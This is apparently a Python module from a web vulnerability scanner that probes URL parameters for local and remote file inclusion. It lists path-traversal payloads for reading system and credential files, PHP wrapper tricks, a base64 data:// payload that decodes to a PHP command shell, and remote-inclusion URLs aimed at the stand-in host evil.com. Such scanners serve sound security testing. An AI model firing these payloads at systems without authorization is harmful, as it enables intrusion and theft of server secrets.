"""
LFI / RFI scanner.
"""
from __future__ import annotations

import time
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode

import aiohttp

from scanner.utils import http as http_util

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "file:///etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=config.php",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    # Windows
    "C:\\boot.ini",
    "C:/windows/win.ini",
    "C:/windows/system32/drivers/etc/hosts",
    "..\\..\\..\\windows\\win.ini",
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt?",
    "https://evil.com/shell.txt?",
    "//evil.com/shell.txt?",
]

FILE_PARAM_NAMES = {"file", "page", "template", "include", "path", "dir",
                    "load", "read", "fetch", "doc", "document", "view"}

LFI_SIGNATURES = [
    "root:x:",           # /etc/passwd
    "bin:x:",
    "[boot loader]",     # boot.ini
    "[fonts]",           # win.ini
    "apache:x:",
    "/bin/bash",
    "USER=",             # /proc/self/environ
    "HTTP_HOST=",
]


async def scan(session: aiohttp.ClientSession, url: str, forms=None) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    parsed = urlparse(url)

    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        # Prioritise likely file-related params
        file_params = [p for p in params if p.lower() in FILE_PARAM_NAMES] or list(params.keys())

        for param in file_params:
            # LFI
            for payload in LFI_PAYLOADS:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = payload
                test_url = parsed._replace(query=urlencode(tp)).geturl()
                resp = await http_util.get(session, test_url, timeout=10)
                if resp is None:
                    continue
                try:
                    text = await resp.text(errors="ignore")
                except Exception:
                    continue
                if any(sig in text for sig in LFI_SIGNATURES):
                    findings.append(_make(url, param, payload, "lfi", text[:500]))
                    break

            # RFI
            for payload in RFI_PAYLOADS:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = payload
                test_url = parsed._replace(query=urlencode(tp)).geturl()
                resp = await http_util.get(session, test_url, timeout=10)
                if resp is None:
                    continue
                try:
                    text = await resp.text(errors="ignore")
                except Exception:
                    continue
                if "<?php" in text or "<?=" in text:
                    findings.append(_make(url, param, payload, "rfi", text[:200]))
                    break

    return findings


def _make(url, param, payload, context, evidence) -> Dict[str, Any]:
    return {
        "type":      "file_inclusion",
        "severity":  "critical",
        "url":       url,
        "parameter": param,
        "payload":   payload,
        "context":   context,
        "evidence":  evidence,
        "details":   f"{'Local' if context == 'lfi' else 'Remote'} File Inclusion",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }
